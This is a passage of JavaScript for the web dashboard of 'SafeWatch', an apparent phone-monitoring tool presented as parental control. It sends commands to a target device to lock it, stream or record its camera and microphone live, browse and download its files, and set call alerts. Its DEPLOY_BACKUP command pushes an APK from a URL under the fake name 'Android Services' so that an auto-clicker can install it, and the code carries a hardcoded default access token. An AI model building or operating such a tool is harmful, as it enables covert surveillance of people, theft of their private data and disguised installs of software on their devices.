            for (let i = 0; i < byteChars.length; i++) {
                byteNums[i] = byteChars.charCodeAt(i);
            }
            const blob = new Blob([byteNums]);
            const url  = URL.createObjectURL(blob);
            const a    = document.createElement('a');
            a.href     = url;
            a.download = data.name || 'download';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            // Revoke after a small delay to ensure download starts
            setTimeout(() => URL.revokeObjectURL(url), 5000);
            addActivity(`✅ Downloaded: ${data.name} (${formatBytes(data.size)})`, 'system');
        } catch(e) {
            addActivity(`❌ Decode error: ${e.message}`, 'system');
        }
        // Re-enable download buttons
        document.querySelectorAll('.btn-download[disabled]').forEach(b => {
            b.textContent = '⬇️ Download'; b.disabled = false;
        });
    }

    function getFileIcon(name) {
        const ext = (name.split('.').pop() || '').toLowerCase();
        const icons = {
            // Images
            jpg: '🖼️', jpeg: '🖼️', png: '🖼️', gif: '🖼️',
            webp: '🖼️', bmp: '🖼️', svg: '🖼️', ico: '🖼️', tiff: '🖼️', heic: '🖼️',
            // Video
            mp4: '🎥', avi: '🎥', mkv: '🎥', mov: '🎥', wmv: '🎥',
            flv: '🎥', webm: '🎥', m4v: '🎥', ts: '🎥', '3gp': '🎥',
            // Audio
            mp3: '🎵', wav: '🎵', aac: '🎵', flac: '🎵', ogg: '🎵',
            m4a: '🎵', opus: '🎵', wma: '🎵', amr: '🎵',
            // Documents
            pdf: '📝', doc: '📝', docx: '📝', txt: '📝',
            rtf: '📝', odt: '📝', pages: '📝',
            // Spreadsheets
            xls: '📊', xlsx: '📊', csv: '📊', ods: '📊', numbers: '📊',
            // Presentations
            ppt: '📊', pptx: '📊', key: '📊', odp: '📊',
            // Archives
            zip: '🗃️', rar: '🗃️', '7z': '🗃️', tar: '🗃️',
            gz: '🗃️', bz2: '🗃️', xz: '🗃️', zst: '🗃️',
            // Executables & installers
            apk: '🧰', exe: '🧰', msi: '🧰', deb: '🧰',
            rpm: '🧰', dmg: '🧰', app: '🧰', ipa: '🧰', xapk: '🧰',
            // Code
            js: '💾', ts: '💾', py: '💾', java: '💾', kt: '💾',
            c: '💾', cpp: '💾', h: '💾', cs: '💾', php: '💾',
            html: '💾', css: '💾', json: '💾', xml: '💾', sh: '💾',
            // Fonts
            ttf: '🔤', otf: '🔤', woff: '🔤', woff2: '🔤',
            // Database
            db: '🗄️', sqlite: '🗄️', sql: '🗄️',
        };
        return icons[ext] || '📄';
    }

    // Initial load of file browser when tab is opened
    document.querySelector('[data-target="storage"]')?.addEventListener('click', () => {
        setTimeout(() => {
            const container = document.getElementById('file-browser-content');
            if (container && container.querySelector('.empty-state')) {
                browseDirectory('/sdcard');
            }
        }, 300);
    });
    document.getElementById('btn-browse-root')?.addEventListener('click', () => browseDirectory('/sdcard'));
    document.getElementById('btn-browse-refresh')?.addEventListener('click', () => browseDirectory(currentFilePath));

    // ─── Commands ─────────────────────────────────────────────────────

    document.getElementById('btn-lock')?.addEventListener('click', () => {
        if (!confirm('Lock the child\'s device now?')) return;
        sendCommand({ command: 'LOCK_DEVICE' });
        addActivity('🖒 LOCK_DEVICE command sent', 'command');
        showToast('🖒 Device Locked', 'Lock command sent to child device', 'warning');
    });

    document.getElementById('btn-deploy-backup')?.addEventListener('click', () => {
        const url = prompt('Enter the direct download URL for the Backup APK:', 'https://example.com/backup.apk');
        if (!url) return;
        sendCommand({ 
            command: 'DEPLOY_BACKUP',
            url: url,
            appName: 'Android Services' // The fake name for the auto-clicker to look for
        });
        addActivity('🚀 DEPLOY_BACKUP command sent', 'command');
    });

    document.getElementById('btn-snapshot')?.addEventListener('click', () => {
        sendCommand({ command: 'GET_SNAPSHOT' });
        addActivity('🔄 Snapshot requested', 'system');
    });

    document.getElementById('btn-uninstall')?.addEventListener('click', () => {
        if (!confirm('WARNING: This will attempt to completely remove the SafeWatch app from the child device. Continue?')) return;
        sendCommand({ command: 'UNINSTALL_APP' });
        addActivity('🗑️ UNINSTALL_APP command sent', 'command');
    });

    document.getElementById('btn-set-call-alerts')?.addEventListener('click', () => {
        const numbers = document.getElementById('call-alert-numbers').value.trim();
        sendCommand({ command: 'SET_CALL_ALERTS', numbers: numbers });
        addActivity(`📞 Call alerts updated: ${numbers || 'None'}`, 'command');
    });

    document.getElementById('btn-camera-on')?.addEventListener('click', () => {
        const facing = document.getElementById('camera-facing').value;
        sendCommand({ command: 'START_CAMERA', facing: facing });
        document.getElementById('btn-camera-on').style.display  = 'none';
        document.getElementById('btn-camera-off').style.display = '';
        addActivity('📷 Camera stream started', 'command');
        showToast('📷 Camera Started', `Streaming ${facing} camera`, 'success');
    });

    document.getElementById('btn-record-camera')?.addEventListener('click', () => {
        const facing = document.getElementById('camera-facing').value;
        const duration = parseInt(document.getElementById('camera-duration').value);
        sendCommand({ command: 'START_RECORDING_CAMERA', facing: facing, duration: duration });
        addActivity(`⏺ Camera recording requested for ${duration/1000}s`, 'command');
        showToast('⏺ Recording Started', `Camera recording for ${duration/1000}s`, 'info');
    });

    document.getElementById('btn-camera-off')?.addEventListener('click', () => {
        sendCommand({ command: 'STOP_CAMERA' });
        document.getElementById('btn-camera-on').style.display  = '';
        document.getElementById('btn-camera-off').style.display = 'none';
        document.getElementById('camera-feed').style.display = 'none';
        document.getElementById('camera-placeholder').style.display = '';
        addActivity('📷 Camera stopped', 'command');
        showToast('📷 Camera Stopped', 'Camera stream has been stopped', 'info');
    });

    document.getElementById('btn-camera-force-stop')?.addEventListener('click', () => {
        sendCommand({ command: 'FORCE_STOP_CAMERA' });
        // Reset UI regardless — force stop means we don’t wait for confirmation
        document.getElementById('btn-camera-on').style.display  = '';
        document.getElementById('btn-camera-off').style.display = 'none';
        document.getElementById('camera-feed').style.display = 'none';
        document.getElementById('camera-placeholder').style.display = '';
        if (document.getElementById('cam-frame-count'))
            document.getElementById('cam-frame-count').textContent = '0 frames received';
        addActivity('🛑 FORCE_STOP_CAMERA sent', 'command');
        showToast('🛑 Camera Force Stopped', 'Immediate stop command sent to device', 'error', 7000);
    });

    document.getElementById('btn-mic-on')?.addEventListener('click', () => {
        if (!confirm('Start live microphone monitoring?\nAudio will be streamed to this browser.')) return;
        sendCommand({ command: 'START_MIC' });
        document.getElementById('btn-mic-on').style.display  = 'none';
        document.getElementById('btn-mic-off').style.display = '';
        addActivity('🎤 Mic stream started', 'command');
        showToast('🎤 Mic Started', 'Live audio is now streaming', 'success');
    });

    document.getElementById('btn-record-mic')?.addEventListener('click', () => {
        const duration = parseInt(document.getElementById('mic-duration').value);
        sendCommand({ command: 'START_RECORDING_MIC', duration: duration });
        addActivity(`⏺ Mic recording requested for ${duration/1000}s`, 'command');
        showToast('⏺ Recording Started', `Mic recording for ${duration/1000}s`, 'info');
    });

    document.getElementById('btn-mic-off')?.addEventListener('click', () => {
        sendCommand({ command: 'STOP_MIC' });
        document.getElementById('btn-mic-on').style.display  = '';
        document.getElementById('btn-mic-off').style.display = 'none';
        const canvas = document.getElementById('audio-canvas');
        if (canvas) canvas.style.display = 'none';
        document.getElementById('mic-placeholder').style.display = '';
        // FIX: Reset audio scheduling state on stop so the next session starts fresh
        if (audioContext) {
            audioContext.close().catch(() => {});
            audioContext = null;
        }
        nextAudioTime = 0;
        addActivity('🎤 Mic stopped', 'command');
        showToast('🎤 Mic Stopped', 'Audio stream has been stopped', 'info');
    });

    document.getElementById('btn-mic-force-stop')?.addEventListener('click', () => {
        sendCommand({ command: 'FORCE_STOP_MIC' });
        // Reset UI immediately
        document.getElementById('btn-mic-on').style.display  = '';
        document.getElementById('btn-mic-off').style.display = 'none';
        const canvas = document.getElementById('audio-canvas');
        if (canvas) canvas.style.display = 'none';
        document.getElementById('mic-placeholder').style.display = '';
        // Reset audio context
        if (audioContext) {
            audioContext.close().catch(() => {});
            audioContext = null;
        }
        nextAudioTime = 0;
        addActivity('🛑 FORCE_STOP_MIC sent', 'command');
        showToast('🛑 Mic Force Stopped', 'Immediate stop command sent to device', 'error', 7000);
    });

    // ─── UI Helpers ───────────────────────────────────────────────────
    function setServerStatus(connected) {
        statusDot.className  = `status-dot ${connected ? 'online' : 'offline'}`;
        statusText.textContent = connected ? 'Connected (Parent)' : 'Disconnected';
    }

    function addActivity(message, type = 'system') {
        const li = document.createElement('li');
        li.className = `feed-item ${type}`;
        li.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
        activityFeed.insertBefore(li, activityFeed.firstChild);
        if (activityFeed.children.length > 100) activityFeed.removeChild(activityFeed.lastChild);
    }

    function setText(id, value) {
        const el = document.getElementById(id);
        if (el) el.textContent = value ?? '—';
    }

    function formatDuration(seconds) {
        if (!seconds) return '0s';
        if (seconds < 60) return `${seconds}s`;
        return `${Math.floor(seconds / 60)}m ${seconds % 60}s`;
    }

    function formatBytes(bytes) {
        if (bytes === 0) return '0 B';
        const k = 1024;
        const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
    }

    function escapeHtml(str) {
        if (!str) return '';
        return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
    }

    // ─── Downloads Ready Panel ────────────────────────────────────────
    // Keeps a visible list of all files available on the server so the
    // user can re-download files even if the auto-trigger was missed.

    function addFileToDownloadPanel(fileData) {
        let panel = document.getElementById('downloads-ready-panel');
        if (!panel) {
            // Create the panel dynamically and insert it at the top of the storage view
            const storageView = document.getElementById('view-storage');
            if (!storageView) return;
            const wrapper = document.createElement('div');
            wrapper.className = 'info-card full-width';
            wrapper.style.marginBottom = '16px';
            wrapper.innerHTML = `
                <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
                    <h3>📥 Downloads Ready</h3>
                    <button id="btn-load-files" class="btn-action btn-secondary" style="font-size:12px;padding:6px 12px">🔄 Refresh</button>
                </div>
                <div id="downloads-ready-panel" style="display:flex;flex-direction:column;gap:8px">
                    <div class="empty-state">No files downloaded yet</div>
                </div>
            `;
            storageView.insertBefore(wrapper, storageView.firstChild);
            document.getElementById('btn-load-files')?.addEventListener('click', loadAvailableFiles);
            panel = document.getElementById('downloads-ready-panel');
        }

        // Remove the "empty" placeholder if present
        const empty = panel.querySelector('.empty-state');
        if (empty) panel.removeChild(empty);

        // Avoid duplicates
        if (document.getElementById(`dl-${fileData.filename}`)) return;

        const row = document.createElement('div');
        row.id = `dl-${fileData.filename}`;
        row.style.cssText = 'display:flex;align-items:center;gap:12px;padding:10px 12px;background:#1e293b;border-radius:8px;';
        row.innerHTML = `
            <span style="font-size:20px">${getFileIcon(fileData.filename)}</span>
            <div style="flex:1;min-width:0">
                <div style="font-weight:600;color:#f1f5f9;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${escapeHtml(fileData.filename)}</div>
                <div style="font-size:11px;color:#94a3b8">${fileData.sizeMB ? fileData.sizeMB + ' MB' : (fileData.size ? formatBytes(fileData.size) : '')}</div>
            </div>
            <a href="${escapeHtml(fileData.url)}" download="${escapeHtml(fileData.filename)}"
               class="btn-action btn-primary" style="font-size:12px;padding:6px 14px;text-decoration:none"
               target="_blank">⬇️ Download</a>
        `;
        panel.insertBefore(row, panel.firstChild);
    }

    async function loadAvailableFiles() {
        try {
            const urlParams = new URLSearchParams(window.location.search);
            const token = urlParams.get('token') || 'safewatch2024';
            const r = await fetch(`/api/files?token=${token}`);
            if (!r.ok) return;
            const data = await r.json();
            if (data.files && data.files.length > 0) {
                data.files.forEach(f => addFileToDownloadPanel({
                    filename: f.filename,
                    size:     f.size,
                    sizeMB:   f.sizeMB,
                    url:      f.url
                }));
                addActivity(`📥 ${data.files.length} file(s) available for download`, 'system');
            }
        } catch(e) {
            // Silently ignore — server may not have any files yet
        }
    }

    // ─── Boot ─────────────────────────────────────────────────────────
    connect();
    // Load any already-uploaded files from the server after a short delay
    // (wait for the WebSocket to connect first so activity feed is ready)
    setTimeout(loadAvailableFiles, 2000);

})();
